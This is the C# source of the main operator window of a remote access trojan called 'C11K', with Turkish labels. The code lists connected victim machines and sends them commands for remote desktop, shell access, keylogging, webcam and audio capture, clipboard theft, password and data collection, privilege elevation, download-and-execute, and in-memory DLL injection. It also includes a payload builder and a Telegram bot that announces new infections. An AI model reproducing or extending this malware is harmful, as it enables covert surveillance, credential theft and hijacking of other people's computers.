// Dosya: Form1.cs (kök)
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace App.Service
{
    public class Form1 : DarkForm
    {
        const string GithubUrl = "https://github.com/denizpro";
        const string DiscordTag = "deniz.pro";

        readonly SessionManager _mgr = new SessionManager();
        readonly TgBot _bot = new TgBot();
        ClientsPanel _clients;
        BuilderPanel _builder;
        SettingsPanel _settings;
        LogsPanel _logs;
        RailButton _btnClients, _btnBuilder, _btnSettings, _btnLogs, _btnAbout, _activeBtn;
        Label _statLine;
        BufferedPanel _rail;
        System.Windows.Forms.Timer _pingTimer;
        System.Windows.Forms.Timer _slide;
        bool _uiReady;
        readonly HashSet<string> _fav = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        readonly Dictionary<string, ClientSession> _known = new Dictionary<string, ClientSession>(StringComparer.OrdinalIgnoreCase);
        DateTime _lastKnownSave = DateTime.MinValue;
        const int RailWidth = 66;

        ClientSession _drawerSess;
        Image _drawerThumbSrc;

        public Form1()
        {
            try
            {
                FormBorderStyle = FormBorderStyle.None;
                StartPosition = FormStartPosition.CenterScreen;
                DoubleBuffered = true;
                ShowInTaskbar = true;
                Opacity = 1;

                AutoScaleMode = AutoScaleMode.Dpi;

                BuildChrome("C11" + "K  •  " + Environment.MachineName);
                Size = new Size(1200, 760);
                MinimumSize = new Size(900, 580);
                MaximizeBox = true;

                Notify.Load();
                foreach (var f in Storage.Load("favorites.txt")) _fav.Add(f);
                foreach (var b in Storage.Load("blocked.txt")) _mgr.Blocked.Add(b);
                LoadKnown();

                BuildSidebar();
                Title.Padding = new Padding(RailWidth + 10, 0, 0, 0);
                BuildPanels();

                _mgr.OnSession += SessionAdded;
                _mgr.OnGone += SessionGone;
                _mgr.OnMessage += MessageIn;
                _mgr.OnLog += Log;

                _bot.Init(_mgr, Log);
                if (Notify.Token.Length > 0) StartBot(false);

                _pingTimer = new System.Windows.Forms.Timer { Interval = 25000 };
                _pingTimer.Tick += (s, e) => PingAll();
                _pingTimer.Start();

                if (_clients != null) { _clients.Visible = true; _clients.BringToFront(); }
            }
            catch (Exception ex)
            {
                Dump(ex);
                MessageBox.Show(ex.ToString(), "Form1 kurulum hatası", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        static void Dump(Exception ex)
        {
            if (ex == null) return;
            try
            {
                string dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "C11" + "K");
                Directory.CreateDirectory(dir);
                File.AppendAllText(Path.Combine(dir, "crash.txt"), DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "\r\n" + ex + "\r\n\r\n");
            }
            catch { }
        }

        void InitUi()
        {
            if (IsDisposed) return;
            try
            {
                ShowPanel(_clients);
                RefreshList();
                UpdateStatus();

                if (_uiReady) return;
                _uiReady = true;
                Log("Hazır. Dinlemeye başlamak için Ayarlar > Dinle.");
                WakeUpAll();
            }
            catch (Exception ex) { Dump(ex); }
        }

        void WakeUpAll()
        {
            try
            {
                var known = _known.Values.ToList();
                if (known.Count == 0) return;

                using (var udp = new UdpClient())
                {
                    udp.EnableBroadcast = true;
                    var ep = new IPEndPoint(IPAddress.Broadcast, 4445);

                    foreach (var s in known)
                    {
                        try
                        {
                            byte[] b = Encoding.UTF8.GetBytes("WAKE");
                            udp.Send(b, b.Length, ep);
                        }
                        catch { }
                    }
                }

                Log("Wake-up sinyali gönderildi: " + known.Count + " kayıt");
            }
            catch { }
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            InitUi();
        }

        protected override void OnShown(EventArgs e)
        {
            base.OnShown(e);
            Activate();
            InitUi();
        }

        static string B64E(string s) { return Convert.ToBase64String(Encoding.UTF8.GetBytes(s ?? "")); }
        static string B64D(string s)
        {
            try { return Encoding.UTF8.GetString(Convert.FromBase64String(s)); } catch { return s ?? ""; }
        }

        void StartBot(bool announce)
        {
            if (_settings == null) return;

            string token = _settings.TxtTgToken.Text.Trim();
            string chat = _settings.TxtTgChat.Text.Trim();
            if (token.Length == 0) { MessageBox.Show("Bot token boş.", "Telegram"); return; }

            if (_bot.Start(token, chat))
            {
                if (_settings.LblBot != null) { _settings.LblBot.Text = "Bot: çalışıyor"; _settings.LblBot.ForeColor = Theme.Current.Ok; }
                if (_settings.BtnBot != null) _settings.BtnBot.Text = "Botu Durdur";
                if (announce) Notify.Send("<b>C11" + "K</b>\nBot aktif. /help");
            }
        }

        void StopBot()
        {
            _bot.Stop();
            if (_settings == null) return;
            if (_settings.LblBot != null) { _settings.LblBot.Text = "Bot: kapalı"; _settings.LblBot.ForeColor = Theme.Current.Muted; }
            if (_settings.BtnBot != null) _settings.BtnBot.Text = "Botu Başlat";
        }

        void LoadKnown()
        {
            try
            {
                string raw = Storage.Read("known.txt");
                if (raw.Length == 0) return;

                foreach (string line in raw.Split('\n'))
                {
                    string[] p = line.Trim().Split('|');
                    if (p.Length < 10) continue;

                    long ticks;
                    long.TryParse(p[8], out ticks);

                    var s = new ClientSession
                    {
                        Sid = "",
                        UserPc = B64D(p[0]),
                        Ip = B64D(p[1]),
                        Tag = B64D(p[2]),
                        Os = B64D(p[3]),
                        Av = B64D(p[4]),
                        Ram = B64D(p[5]),
                        Cam = B64D(p[6]),
                        Version = B64D(p[7]),
                        IsAdmin = p[9] == "1",
                        LastSeen = ticks > 0 ? new DateTime(ticks, DateTimeKind.Utc) : DateTime.UtcNow,
                        Connected = ticks > 0 ? new DateTime(ticks, DateTimeKind.Utc) : DateTime.UtcNow,
                        Alive = false,
                        Online = false
                    };

                    if (!string.IsNullOrEmpty(s.UserPc)) _known[s.UserPc] = s;
                }

                TrimKnown();
            }
            catch { }
        }

        void TrimKnown()
        {
            while (_known.Count > 400)
            {
                var oldest = _known.OrderBy(kv => kv.Value.LastSeen).First().Key;
                _known.Remove(oldest);
            }
        }

        void SaveKnown(bool force)
        {
            if (!force && (DateTime.UtcNow - _lastKnownSave).TotalSeconds < 5) return;
            _lastKnownSave = DateTime.UtcNow;

            try
            {
                var lines = _known.Values
                    .OrderByDescending(s => s.LastSeen)
                    .Take(400)
                    .Select(s => string.Join("|", new[]
                    {
                        B64E(s.UserPc), B64E(s.Ip), B64E(s.Tag), B64E(s.Os), B64E(s.Av),
                        B64E(s.Ram), B64E(s.Cam), B64E(s.Version),
                        s.LastSeen.Ticks.ToString(), s.IsAdmin ? "1" : "0"
                    }));

                Storage.Save("known.txt", lines);
            }
            catch { }
        }

        void BuildSidebar()
        {
            _rail = new BufferedPanel { Dock = DockStyle.Left, Width = RailWidth, BackColor = Theme.Current.Side, Tag = "side" };
            Controls.Add(_rail);
            _rail.BringToFront();

            _rail.Controls.Add(new Label
            {
                Text = "C11" + "K",
                Location = new Point(0, 0),
                Size = new Size(RailWidth, S(TitleHeight) + 14),
                TextAlign = ContentAlignment.MiddleCenter,
                Font = Ui.F(9.5f, FontStyle.Bold),
                ForeColor = Theme.Current.Accent,
                BackColor = Color.Transparent
            });

            int y = S(TitleHeight) + 20;
            _btnClients = RailBtn(_rail, "▤", "İstemciler", y, () => ShowPanel(_clients));
            _btnBuilder = RailBtn(_rail, "⚙", "Builder", y + 56, () => ShowPanel(_builder));
            _btnSettings = RailBtn(_rail, "☰", "Ayarlar", y + 112, () => ShowPanel(_settings));
            _btnLogs = RailBtn(_rail, "▦", "Loglar", y + 168, () => ShowPanel(_logs));
            _btnAbout = RailBtn(_rail, "◈", "Hakkında", y + 224, ShowAbout);

            _statLine = new Label
            {
                Dock = DockStyle.Bottom,
                Height = 96,
                ForeColor = Theme.Current.Muted,
                Font = new Font("Consolas", 7.5f),
                TextAlign = ContentAlignment.MiddleCenter,
                BackColor = Color.Transparent,
                Text = "toplam  0\nadmin   0\nonline  0\n\nv2.0.2"
            };
            _rail.Controls.Add(_statLine);

            _activeBtn = _btnClients;
            _btnClients.SetActive(true);
        }

        RailButton RailBtn(Control parent, string glyph, string text, int y, Action click)
        {
            var b = new RailButton
            {
                Glyph = glyph,
                Caption = text,
                Location = new Point(0, y),
                Size = new Size(RailWidth, 50)
            };
            b.Click += (s, e) => { SetActive(b); click(); };
            parent.Controls.Add(b);
            return b;
        }

        void SetActive(RailButton b)
        {
            if (_activeBtn == b) return;
            if (_activeBtn != null) _activeBtn.SetActive(false);
            _activeBtn = b;
            if (b != null) b.SetActive(true);
            Invalidate();
        }

        void BuildPanels()
        {
            _clients = new ClientsPanel();
            _builder = new BuilderPanel();
            _settings = new SettingsPanel();
            _logs = new LogsPanel();

            _builder.Visible = false;
            _settings.Visible = false;
            _logs.Visible = false;

            foreach (Control p in new Control[] { _clients, _builder, _settings, _logs })
            {
                p.Location = new Point(RailWidth + 1, S(TitleHeight) + 1);
                p.Size = new Size(Width - RailWidth - 2, Height - S(TitleHeight) - 2);
                p.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
                Controls.Add(p);
                p.BringToFront();
            }

            BuildContextMenu();

            _builder.BtnBuild.Click += (s, e) => DoBuild();
            _builder.BtnLoadStage1.Click += (s, e) =>
            {
                using (var ofd = new OpenFileDialog { Filter = "DLL|*.dll" })
                {
                    if (ofd.ShowDialog() != DialogResult.OK) return;
                    byte[] b = File.ReadAllBytes(ofd.FileName);
                    LoaderBin.SetStage1(b);
                    LoaderBin.SetDll(b);
                    _builder.LblMemStatus.Text = "Depo: " + Path.GetFileName(ofd.FileName) + " (" + b.Length + " bayt)";
                    Log("Bellek deposu güncellendi: " + Path.GetFileName(ofd.FileName));
                }
            };
            _builder.BtnSendMem.Click += (s, e) =>
            {
                var cur = SelectedSession();
                if (cur == null || !cur.Online) { Log("Bellek: istemci seçili değil."); return; }
                if (!LoaderBin.HasStage1) { Log("Bellek: depo boş, önce Stage 1 yükle."); return; }
                Send(cur.Sid, "INJECT");
                Log("Bellek: " + cur.UserPc + " için yükleme istendi.");
            };

            _settings.Toggle += ToggleListen;
            _settings.ThemeChanged += ApplyTheme;

            _settings.TxtTgToken.Text = Notify.Token;
            _settings.TxtTgChat.Text = Notify.ChatId;

            _settings.BtnTgTest.Click += (s, e) =>
            {
                Notify.Token = _settings.TxtTgToken.Text.Trim();
                Notify.ChatId = _settings.TxtTgChat.Text.Trim();
                Storage.Write("tg_to" + "ken.txt", Notify.Token);
                Storage.Write("tg_ch" + "at.txt", Notify.ChatId);
                Notify.Send("<b>C11" + "K</b>\nTest bildirimi.");
                MessageBox.Show("Kaydedildi.", "Telegram");
            };

            _settings.BtnBot.Click += (s, e) =>
            {
                if (_bot.Running) { StopBot(); return; }

                Notify.Token = _settings.TxtTgToken.Text.Trim();
                Notify.ChatId = _settings.TxtTgChat.Text.Trim();
                Storage.Write("tg_to" + "ken.txt", Notify.Token);
                Storage.Write("tg_ch" + "at.txt", Notify.ChatId);

                StartBot(true);
            };

            _clients.Grid.SelectionChanged += UpdateDrawer;
            _clients.Quick += key => QuickAction(key);
            _clients.FilterChanged += RefreshList;
            _clients.RefreshAll += () =>
            {
                RefreshList();
                foreach (var kv in _mgr.Sessions) Send(kv.Key, "SHOT");
            };
        }

        ClientSession SelectedSession() { return _clients == null || _clients.Grid == null ? null : _clients.Grid.Selected; }

        void QuickAction(string key)
        {
            var cur = SelectedSession();
            if (cur == null) return;

            switch (key)
            {
                case "uninstall":
                case "elevate":
                case "reconnect":
                    break;
                default:
                    if (!cur.Online) return;
                    break;
            }

            string sid = cur.Sid;
            if (string.IsNullOrEmpty(sid))
            {
                Log(key + ": istemci çevrimdışı, komut gönderilemedi (" + cur.UserPc + ")");
                return;
            }

            switch (key)
            {
                case "shot": Send(sid, "SHOT"); break;
                case "rd": ModuleRegistry.Open<DesktopViewerForm>(cur, Sender(sid)); break;
                case "shell": ModuleRegistry.Open<TerminalForm>(cur, Sender(sid)); break;
                case "files": ModuleRegistry.Open<FileManagerForm>(cur, Sender(sid)); break;
                case "chat": OpenChat(cur); break;
                case "script": ModuleRegistry.Open<ScriptForm>(cur, Sender(sid)); break;
                case "webcam": ModuleRegistry.Open<CamForm>(cur, Sender(sid)); break;
                case "keylog": ModuleRegistry.Open<InputMonitorForm>(cur, Sender(sid)); break;
                case "clip": ModuleRegistry.Open<ClipboardForm>(cur, Sender(sid)); break;
                case "task": ModuleRegistry.Open<TaskManagerForm>(cur, Sender(sid)); break;
                case "reg": ModuleRegistry.Open<RegistryEditorForm>(cur, Sender(sid)); break;
                case "startup": ModuleRegistry.Open<StartupManagerForm>(cur, Sender(sid)); break;
                case "pass": RunCollector(cur); break;
                case "sysinfo": ModuleRegistry.Open<SystemInfoForm>(cur, Sender(sid)); break;
                case "console": ModuleRegistry.Open<ConsoleForm>(cur, Sender(sid), f => f.SetBroadcast(Broadcast)); break;
                case "restart": Send(sid, "POWER|RESTART"); break;
                case "shutdown": Send(sid, "POWER|SHUTDOWN"); break;
                case "logoff": Send(sid, "POWER|LOGOFF"); break;
                case "standby": Send(sid, "POWER|STANDBY"); break;
                case "elevate": Send(sid, "ELEVATE"); break;
                case "reconnect": Send(sid, "RECONNECT"); break;

                case "volup": Send(sid, "VOL|UP"); break;
                case "voldown": Send(sid, "VOL|DOWN"); break;
                case "mute": Send(sid, "VOL|MUTE"); break;
                case "monoff": Send(sid, "MONITOR|OFF"); break;
                case "lock": Send(sid, "LOCK"); break;
                case "cd": Send(sid, "CD"); break;
                case "taskbar": Send(sid, "TASKBAR"); break;
                case "toast":
                    {
                        string t = Input("İstemcide gösterilecek bildirim:", "Merhaba!");
                        if (!string.IsNullOrWhiteSpace(t)) Send(sid, "TOAST|" + B64E(t));
                        break;
                    }
                case "drives": InfoFor("Sürücüler", "DRIVES"); break;
                case "env": InfoFor("Ortam Değişkenleri", "ENV"); break;
                case "hosts": InfoFor("Hosts Dosyası", "HOSTS"); break;
                case "soft": InfoFor("Kurulu Yazılımlar", "SOFT|LIST"); break;
                case "search":
                    {
                        string pat = Input("Aranacak dosya deseni (C:\\ içinde):", "*.txt");
                        if (!string.IsNullOrWhiteSpace(pat)) InfoFor("Dosya Arama", "FILE|SEARCH|C:\\|" + pat);
                        break;
                    }

                case "wallpaper":
                    using (var ofd = new OpenFileDialog { Filter = "Resim|*.jpg;*.jpeg;*.png;*.bmp" })
                    {
                        if (ofd.ShowDialog() != DialogResult.OK) return;
                        Send(sid, "WALLPAPER|" + Convert.ToBase64String(File.ReadAllBytes(ofd.FileName)));
                    }
                    break;
                case "uninstall":
                    if (MessageBox.Show("İstemci kalıcı olarak silinsin mi?", "Onay", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                        Send(sid, "UNINSTALL");
                    break;
            }
        }

        void RunCollector(ClientSession s)
        {
            if (s == null || !s.Online) return;
            string script = Scripts.Collect();
            if (script == null) { Log("scripts/collect.ps1 bulunamadı."); return; }
            ModuleRegistry.Open<ScriptForm>(s, Sender(s.Sid), f => f.SetCode(script));
            Send(s.Sid, "SCRIPT|PS|" + B64E(script));
        }

        void OpenChat(ClientSession s)
        {
            if (s == null || !s.Online) return;

            ChatForm existing;
            if (ModuleRegistry.TryGet(s.Sid, out existing))
            {
                if (existing.WindowState == FormWindowState.Minimized) existing.WindowState = FormWindowState.Normal;
                existing.Activate();
                return;
            }

            string def = Storage.Read("op_na" + "me.txt").Trim();
            if (def.Length == 0) def = Environment.UserName;

            string name = Input("Sohbette görünecek adın:", def);
            if (string.IsNullOrWhiteSpace(name)) return;
            name = name.Trim();
            Storage.Write("op_na" + "me.txt", name);

            ModuleRegistry.Open<ChatForm>(s, Sender(s.Sid), f => f.SetOperator(name));
        }

        void InfoFor(string title, string cmd)
        {
            var s = SelectedSession();
            if (s == null || !s.Online) return;

            InfoTextForm f;
            if (!ModuleRegistry.TryGet(s.Sid, out f))
            {
                f = new InfoTextForm();
                f.Initialize(s, Sender(s.Sid));
                ModuleRegistry.Add(s.Sid, f);
                f.Show();
            }
            f.SetTitle(title + " - " + s.UserPc);
            f.Set("Yükleniyor…");
            Send(s.Sid, cmd);
        }

        int Broadcast(string cmd)
        {
            int n = 0;
            foreach (var kv in _mgr.Sessions)
            {
                if (!kv.Value.Online) continue;
                if (_mgr.Send(kv.Key, cmd)) n++;
            }
            Log("Toplu komut (" + n + "): " + Ui.Short(cmd, 60));
            return n;
        }

        void BuildContextMenu()
        {
            if (_clients == null || _clients.Menu == null) return;
            var m = _clients.Menu;
            m.Items.Clear();

            AddMenu(m, "Kayıttan Sil", () =>
            {
                var s = SelectedSession();
                if (s == null) return;
                _known.Remove(s.UserPc);
                SaveKnown(true);
                RefreshList();
                UpdateDrawer();
            });

            AddMenu(m, "Favoriye Ekle / Çıkar", () =>
            {
                var s = SelectedSession();
                if (s == null) return;
                if (_fav.Contains(s.UserPc)) _fav.Remove(s.UserPc); else _fav.Add(s.UserPc);
                Storage.Save("favorites.txt", _fav);
                RefreshList();
            });

            AddMenu(m, "Bu IP'yi Engelle", () =>
            {
                var s = SelectedSession();
                if (s == null) return;
                _mgr.Blocked.Add(s.Ip);
                Storage.Save("blocked.txt", _mgr.Blocked);
                _mgr.Kick(s.Ip);
                Log("IP engellendi: " + s.Ip);
            });

            m.Items.Add(new ToolStripSeparator());
            AddMenu(m, "Ekran Görüntüsü", () => Send(Online(), "SHOT"));
            AddMenu(m, "Masaüstü", () => OpenFor<DesktopViewerForm>());
            AddMenu(m, "Terminal", () => OpenFor<TerminalForm>());
            AddMenu(m, "Komut Konsolu", () => OpenFor<ConsoleForm>());
            AddMenu(m, "Script Çalıştır", () => OpenFor<ScriptForm>());
            AddMenu(m, "Çalıştır (Run)", () =>
            {
                string line = Input("Çalıştırılacak komut / yol:", "notepad.exe");
                if (!string.IsNullOrEmpty(line)) Send(Online(), "RUN|" + line);
            });
            AddMenu(m, "Dosyalar", () => OpenFor<FileManagerForm>());
            AddMenu(m, "Kayıt Defteri", () => OpenFor<RegistryEditorForm>());
            AddMenu(m, "Süreçler", () => OpenFor<TaskManagerForm>());
            m.Items.Add(new ToolStripSeparator());
            AddMenu(m, "Input Monitor", () => OpenFor<InputMonitorForm>());
            AddMenu(m, "Pano", () => OpenFor<ClipboardForm>());
            AddMenu(m, "Sohbet", () => OpenChat(SelectedSession()));
            AddMenu(m, "Webcam Kare", () => OpenFor<CamForm>());
            AddMenu(m, "Ses Kaydı (5sn)", () => Send(Online(), "AUDIO|5000"));
            m.Items.Add(new ToolStripSeparator());
            AddMenu(m, "Sistem Bilgisi", () => OpenFor<SystemInfoForm>());
            AddMenu(m, "Başlangıç", () => OpenFor<StartupManagerForm>());
            AddMenu(m, "Veri Toplama", () => RunCollector(SelectedSession()));
            AddMenu(m, "Yönetici Olarak Yükselt", () => Send(Online(), "ELEVATE"));

            var media = Sub("Medya & Masaüstü");
            AddSub(media, "Ses Arttır", () => Send(Online(), "VOL|UP"));
            AddSub(media, "Ses Azalt", () => Send(Online(), "VOL|DOWN"));
            AddSub(media, "Sessize Al", () => Send(Online(), "VOL|MUTE"));
            AddSub(media, "Monitörü Kapat", () => Send(Online(), "MONITOR|OFF"));
            AddSub(media, "İş İstasyonunu Kilitle", () => Send(Online(), "LOCK"));
            AddSub(media, "Tam Ekran Kilit", () => Send(Online(), "LOCK|FULLSCREEN"));
            AddSub(media, "CD Tepsisi Aç/Kapat", () => Send(Online(), "CD"));
            AddSub(media, "Görev Çubuğu Gizle/Göster", () => Send(Online(), "TASKBAR"));
            AddSub(media, "Bildirim Göster", () =>
            {
                string t = Input("Bildirim metni:", "Merhaba!");
                if (!string.IsNullOrWhiteSpace(t)) Send(Online(), "TOAST|" + B64E(t));
            });
            m.Items.Add(media);

            var info = Sub("Bilgi Toplama");
            AddSub(info, "Sürücüler", () => InfoFor("Sürücüler", "DRIVES"));
            AddSub(info, "Ortam Değişkenleri", () => InfoFor("Ortam Değişkenleri", "ENV"));
            AddSub(info, "Hosts Dosyası", () => InfoFor("Hosts Dosyası", "HOSTS"));
            AddSub(info, "Kurulu Yazılımlar", () => InfoFor("Kurulu Yazılımlar", "SOFT|LIST"));
            AddSub(info, "DNS Önbelleğini Temizle", () => Send(Online(), "DNS|FLUSH"));
            AddSub(info, "Dosya Ara", () =>
            {
                string pat = Input("Aranacak dosya deseni (C:\\ içinde):", "*.txt");
                if (!string.IsNullOrWhiteSpace(pat)) InfoFor("Dosya Arama", "FILE|SEARCH|C:\\|" + pat);
            });
            m.Items.Add(info);

            var fun = Sub("Eğlence");
            AddSub(fun, "Bip Çal", () => Send(Online(), "BEEP"));
            AddSub(fun, "Duvar Kağıdı Değiştir", () =>
            {
                string sid = Online();
                if (sid == null) return;
                using (var ofd = new OpenFileDialog { Filter = "Resim|*.jpg;*.jpeg;*.png;*.bmp" })
                {
                    if (ofd.ShowDialog() != DialogResult.OK) return;
                    Send(sid, "WALLPAPER|" + Convert.ToBase64String(File.ReadAllBytes(ofd.FileName)));
                }
            });
            AddSub(fun, "Masaüstü İkonlarını Gizle/Göster", () => Send(Online(), "HIDEICONS"));
            m.Items.Add(fun);

            m.Items.Add(new ToolStripSeparator());
            AddMenu(m, "İndir & Çalıştır", () =>
            {
                string url = Input("İndirilecek EXE URL'si:", "");
                if (!string.IsNullOrEmpty(url)) Send(Online(), "DOWNLOAD|EXEC|" + url);
            });
            AddMenu(m, "Yükle & Çalıştır", () =>
            {
                string sid = Online();
                if (sid == null) return;
                using (var ofd = new OpenFileDialog())
                {
                    if (ofd.ShowDialog() != DialogResult.OK) return;
                    Send(sid, "UPLOAD|EXEC|" + Path.GetFileName(ofd.FileName) + "|" + Convert.ToBase64String(File.ReadAllBytes(ofd.FileName)));
                }
            });
            AddMenu(m, "Site Aç", () =>
            {
                string url = Input("Ziyaret edilecek URL:", "https://www.google.com");
                if (!string.IsNullOrEmpty(url)) Send(Online(), "URL|" + url);
            });
            AddMenu(m, "Mesaj Kutusu", () =>
            {
                string sid = Online();
                if (sid == null) return;
                using (var f = new MessageBoxForm())
                {
                    if (f.ShowDialog() != DialogResult.OK) return;
                    Send(sid, "MSG|" + (f.MessageTitle ?? "").Replace("|", "/") + "|" + (f.MessageText ?? "").Replace("|", "/") + "|" + f.SelectedIcon);
                }
            });
            m.Items.Add(new ToolStripSeparator());

            var power = Sub("Güç Komutları");
            foreach (var pair in new[] { new[] { "Yeniden Başlat", "RESTART" }, new[] { "Kapat", "SHUTDOWN" }, new[] { "Beklet", "STANDBY" }, new[] { "Oturum Kapat", "LOGOFF" } })
            {
                var it = Item(pair[0]);
                string cmd = pair[1];
                it.Click += (s, e) => Send(Online(), "POWER|" + cmd);
                power.DropDownItems.Add(it);
            }
            m.Items.Add(power);

            m.Items.Add(new ToolStripSeparator());
            AddMenu(m, "Yeniden Bağlan", () => Send(Online(), "RECONNECT"));
            AddMenu(m, "Client'ı Kaldır", () =>
            {
                if (MessageBox.Show("İstemci kalıcı olarak silinsin mi?\n(Kayıttan da düşecek)", "Onay", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                    Send(Online(), "UNINSTALL");
            });
        }

        ToolStripMenuItem Item(string text)
        {
            return new ToolStripMenuItem(text) { ForeColor = Theme.Current.Text, BackColor = Theme.Current.Card };
        }

        ToolStripMenuItem Sub(string text)
        {
            var it = Item(text);
            it.DropDown.BackColor = Theme.Current.Card;
            it.DropDown.Renderer = new DarkRenderer();
            return it;
        }

        void AddMenu(ContextMenuStrip m, string text, Action click)
        {
            var it = Item(text);
            it.Click += (s, e) => click();
            m.Items.Add(it);
        }

        void AddSub(ToolStripMenuItem parent, string text, Action click)
        {
            var it = Item(text);
            it.Click += (s, e) => click();
            parent.DropDownItems.Add(it);
        }

        string Online()
        {
            var s = SelectedSession();
            return s != null && s.Online ? s.Sid : null;
        }

        void OpenFor<T>() where T : Form, IRemoteModule, new()
        {
            var s = SelectedSession();
            if (s == null || !s.Online) return;
            ModuleRegistry.Open<T>(s, Sender(s.Sid));
        }

        Action<string> Sender(string sid) { return cmd => Send(sid, cmd); }

        void Send(string sid, string cmd)
        {
            if (string.IsNullOrEmpty(sid)) return;
            if (!_mgr.Send(sid, cmd)) Log("Komut gönderilemedi (istemci çevrimdışı).");
        }

        void SessionAdded(ClientSession s)
        {
            if (InvokeRequired) { try { BeginInvoke((MethodInvoker)delegate { SessionAdded(s); }); } catch { } return; }
            if (IsDisposed || _clients == null) return;

            string tg = s.Tag ?? "";
            if (!_clients.TagFilter.Items.Contains(tg)) _clients.TagFilter.Items.Add(tg);

            _known.Remove(s.UserPc);
            SaveKnown(true);

            RefreshList();
            UpdateStatus();
            Send(s.Sid, "SHOT");

            Notify.Send("<b>Yeni bağlantı</b>\n" + s.UserPc + "\nIP: " + s.Ip + "\nOS: " + s.Os + "\nAdmin: " + (s.IsAdmin ? "evet" : "hayır"));
            ShowToast("Yeni istemci", s.UserPc + " • " + s.Ip, Theme.Current.Accent);
        }

        void SessionGone(ClientSession s)
        {
            if (InvokeRequired) { try { BeginInvoke((MethodInvoker)delegate { SessionGone(s); }); } catch { } return; }
            if (IsDisposed || _clients == null) return;

            if (s.Thumb != null) { s.Thumb.Dispose(); s.Thumb = null; }

            s.Online = false;
            s.Alive = false;
            s.Rtt = -1;
            s.LastSeen = DateTime.UtcNow;
            if (!string.IsNullOrEmpty(s.UserPc)) { _known[s.UserPc] = s; TrimKnown(); }
            SaveKnown(true);

            RefreshList();
            UpdateStatus();
            UpdateDrawer();
        }

        void RefreshList()
        {
            if (IsDisposed || _clients == null || _clients.Grid == null) return;

            string q = _clients.Filter.Text.Trim();
            if (q == ClientsPanel.Ph) q = "";

            string tag = _clients.TagFilter == null || _clients.TagFilter.SelectedIndex <= 0
                ? null
                : Convert.ToString(_clients.TagFilter.SelectedItem);

            int sort = _clients.SortBox != null ? _clients.SortBox.SelectedIndex : 0;
            bool onlyOnline = _clients.OnlyOnline != null && _clients.OnlyOnline.Checked;

            _clients.Grid.SortColumn = sort == 3 ? 3 : sort == 4 ? 4 : sort == 5 ? 5 : 1;
            _clients.Grid.SortDesc = sort == 1;

            Func<ClientSession, bool> match = s =>
            {
                string ip = s.Ip ?? "";
                string pc = s.UserPc ?? "";
                string tg = s.Tag ?? "";
                string os = s.Os ?? "";

                return (tag == null || tg == tag) &&
                       (q.Length == 0
                        || ip.IndexOf(q, StringComparison.OrdinalIgnoreCase) >= 0
                        || pc.IndexOf(q, StringComparison.OrdinalIgnoreCase) >= 0
                        || tg.IndexOf(q, StringComparison.OrdinalIgnoreCase) >= 0
                        || os.IndexOf(q, StringComparison.OrdinalIgnoreCase) >= 0);
            };

            var online = _mgr.Sessions.Values.Where(match).ToList();
            var onlinePc = new HashSet<string>(online.Select(x => x.UserPc ?? ""), StringComparer.OrdinalIgnoreCase);
            var offline = onlyOnline ? new List<ClientSession>() : _known.Values.Where(s => !onlinePc.Contains(s.UserPc ?? "")).Where(match).ToList();

            var all = online.Concat(offline).ToList();

            switch (sort)
            {
                case 1: all = all.OrderByDescending(x => x.Online).ThenByDescending(x => x.UserPc).ToList(); break;
                case 2: all = all.OrderByDescending(x => x.Online).ThenBy(x => x.Ip).ToList(); break;
                case 3: all = all.OrderByDescending(x => x.Online).ThenBy(x => x.Rtt < 0 ? int.MaxValue : x.Rtt).ToList(); break;
                case 4: all = all.OrderByDescending(x => x.Online).ThenByDescending(x => x.IsAdmin).ThenBy(x => x.UserPc).ToList(); break;
                case 5: all = all.OrderByDescending(x => x.Online).ThenByDescending(x => x.LastSeen).ToList(); break;
                default: all = all.OrderByDescending(x => x.Online).ThenBy(x => x.UserPc).ToList(); break;
            }

            var cur = _clients.Grid.Selected;
            string keep = cur == null ? null : (cur.Online ? cur.Sid : "off:" + cur.UserPc);

            _clients.Grid.SetRows(all, s => _fav.Contains(s.UserPc ?? ""));
            if (!string.IsNullOrEmpty(keep)) _clients.Grid.SelectKey(keep);
            UpdateDrawer();
        }

        void UpdateDrawer()
        {
            if (_clients == null) return;

            var s = SelectedSession();
            if (s == null)
            {
                _clients.ClearDrawer();
                _drawerSess = null;
                _drawerThumbSrc = null;
                return;
            }

            var info = new string[9];
            info[0] = Ui.Short(s.Os, 30);
            info[1] = s.IsAdmin ? "Admin" : "Kullanıcı";
            info[2] = Ui.Short(s.Av, 22);
            info[3] = s.Ram;
            info[4] = s.Cam;
            info[5] = Math.Max(1, s.Monitors).ToString();
            info[6] = s.Rtt < 0 ? "—" : s.Rtt + " ms";
            info[7] = s.Online && s.UptimeSec > 0 ? Ui.Ago(DateTime.UtcNow.AddSeconds(-s.UptimeSec)) : "—";
            info[8] = s.Online ? "şimdi" : Ui.Ago(s.LastSeen) + " önce";

            string sub = (s.Ip ?? "") + (string.IsNullOrEmpty(s.Tag) ? "" : "   •   " + s.Tag);

            Image thumb = null;
            if (!ReferenceEquals(_drawerSess, s) || !ReferenceEquals(_drawerThumbSrc, s.Thumb))
            {
                _drawerSess = s;
                _drawerThumbSrc = s.Thumb;
                if (s.Thumb != null) thumb = (Image)s.Thumb.Clone();
            }
            else if (_drawerThumbSrc != null)
            {
                thumb = (Image)_drawerThumbSrc.Clone();
            }

            _clients.FillDrawer(
                s.UserPc,
                s.Online ? "● Çevrimiçi" : "○ Çevrimdışı",
                s.Online,
                sub,
                info,
                thumb);
        }

        void UpdateStatus()
        {
            if (IsDisposed || _clients == null) return;

            int total = _mgr.Sessions.Count;
            int admins = _mgr.Sessions.Values.Count(s => s.IsAdmin);

            _clients.LblCount.Text = "Bağlı " + total;
            _clients.LblAdmin.Text = "Admin " + admins;
            _clients.LblCrypto.Text = string.IsNullOrEmpty(_mgr.AesKey) ? "Şifreleme kapalı" : "AES-256 / oturum";
